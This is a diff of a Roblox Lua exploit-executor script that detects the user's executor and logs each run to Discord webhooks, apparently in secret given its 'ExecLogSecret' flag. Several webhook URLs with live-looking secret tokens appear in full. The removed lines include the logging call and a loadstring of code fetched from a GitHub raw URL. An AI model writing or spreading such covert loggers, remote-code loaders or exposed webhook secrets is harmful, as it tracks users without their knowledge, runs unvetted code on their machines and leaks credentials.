@@ -6,8 +6,6 @@ local plr = Players.LocalPlayer
 
 local webhook = "https://discord.com/api/webhooks/1453488736196231341/6kgxStN0Upv7Hqj8srIQK3y3lcXFja_qjiLwP_o5LqHDI8YW6DF0OxeNxIfxKXWK3v46"
 
-local webhook = "https://discord.com/api/webhooks/1496237728172478495/aZkh2A6UECw2sEn3obKQ4SkBg0ls1PTYdgaXDayfTPm8UidSc86cv8aPjg0cUxzI6trt"
-
 local executor = (
     getexecutorname and getexecutorname() or
     identifyexecutor and identifyexecutor() or
@@ -87,8 +85,6 @@ if req then
 end
 --// Config
 getgenv().whscript = "astatine script"
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1425335660461559868/WEQTCjQ4Aph1No06hPyUbyuKcweH3RYCtUPb_6XkPJnzLdAWqKIANrGDyaHIqCoiweDn"
-
 getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1496237728172478495/aZkh2A6UECw2sEn3obKQ4SkBg0ls1PTYdgaXDayfTPm8UidSc86cv8aPjg0cUxzI6trt"
 
 getgenv().ExecLogSecret = true
@@ -164,7 +160,3 @@ local function logExecution()
         Body = httpService:JSONEncode({embeds = {embed}})
     })
 end
-
---// Execute
-logExecution()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bla3de/friendly-octo-system/refs/heads/main/z%20vhf%20zc"))()
